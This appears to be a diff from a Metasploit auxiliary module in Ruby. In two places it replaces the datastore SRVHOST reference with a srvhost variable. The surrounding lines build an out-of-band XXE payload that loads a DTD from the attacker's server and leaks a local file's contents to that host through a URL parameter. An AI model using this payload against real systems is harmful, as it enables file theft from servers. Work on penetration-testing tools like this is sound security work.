@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     ent_file = Rex::Text.rand_text_alpha_lower(4..8)
     %(
       <!ENTITY % #{ent_file} SYSTEM "#{filter_path}">
-      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/?#{leak_param_name}=%#{ent_file};'>">
+      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM 'http://#{srvhost}:#{datastore['SRVPORT']}/?#{leak_param_name}=%#{ent_file};'>">
     )
   end
 
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
     xml += '['
     xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
-    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
+    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{srvhost}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
     xml += ']'
     xml += "> <r>&#{ent_eval};</r>"
 
